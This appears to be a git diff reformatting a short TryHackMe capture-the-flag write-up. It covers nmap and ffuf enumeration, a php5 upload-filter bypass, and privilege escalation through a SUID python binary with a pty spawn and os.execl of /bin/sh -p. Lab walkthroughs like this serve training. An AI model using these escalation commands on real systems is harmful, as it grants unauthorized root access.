@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="root.png" width=200 height=200 alt="root">
+{{< post-img src="root.png" alt="root" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -35,9 +33,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-
-```
+```bash
 .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -50,14 +46,13 @@ uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
 ```
 
 That room is self-explanatory...its a big no sh\*t sherlock
-
 As guided this is I am sprinting this so just flags here
 
 oh `php no permitido`
 
 lmao...lets just try `php5`
 
-```
+```bash
 $ cd /var/www
 $ ls
 html
@@ -70,7 +65,7 @@ Time to get better privileges
 
 ## Privilege Escalation
 
-```
+```bash
 $ find / -user root -perm /4000 2> /dev/null
 
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -128,25 +123,19 @@ $ find / -user root -perm /4000 2> /dev/null
 ```
 
 So now they let people run python with SUID
-
-that bad boy can litterally execute commands
-
+that bad boy can literally execute commands
 `/usr/bin/python`
-
 For better comfort
 
-```
+```bash
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 bash-4.4$
 ```
-
 Now look I am going to spawn a shell
-
 `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-
 Ta-daaa!
 
-```
+```bash
 # cat root.txt
 
 cat root.txt
